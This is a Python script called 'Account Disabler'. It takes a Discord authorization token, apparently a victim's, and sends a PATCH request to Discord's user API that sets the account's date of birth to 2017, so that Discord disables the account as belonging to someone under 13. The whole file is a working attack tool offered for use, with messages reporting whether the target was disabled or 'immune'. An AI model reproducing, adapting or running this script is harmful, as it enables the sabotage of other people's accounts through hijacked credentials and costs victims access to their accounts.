# Name: Account Disabler
# Description: Disable (ban) Discord accounts through authorization tokens
# Author: checksum (@0daySkid)

import requests

class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'

class Exploit:

    DISABLED_MESSAGE = "You need to be 13 or older in order to use Discord."
    IMMUNE_MESSAGE = "You cannot update your date of birth."

    def __init__(self, token):
        self.token = token
        self.headers = {'Authorization': token}


    def execute(self):
        """ set DoB to < 13 yo """
        res = requests.patch('https://discordapp.com/api/v6/users/@me', headers=self.headers, json={'date_of_birth': '2017-2-11'})

        if res.status_code == 400:
            res_message = res.json().get('date_of_birth', ['no response message'])[0]

            if res_message == self.DISABLED_MESSAGE:
                print('Account disabled')

            elif res_message == self.IMMUNE_MESSAGE:
                print('Account is immune to this exploit')

            else:
                print(f'Unknown response message: {res_message}')
        else:
            print('Failed to disable account')


def main():
    token = input(f"{Colors.red}(Pre Authenticated Discord Account Disabler){Colors.end} [Enter Discord Token]:~#")
    exploit = Exploit(token)
    exploit.execute()


if __name__ == '__main__':
    main()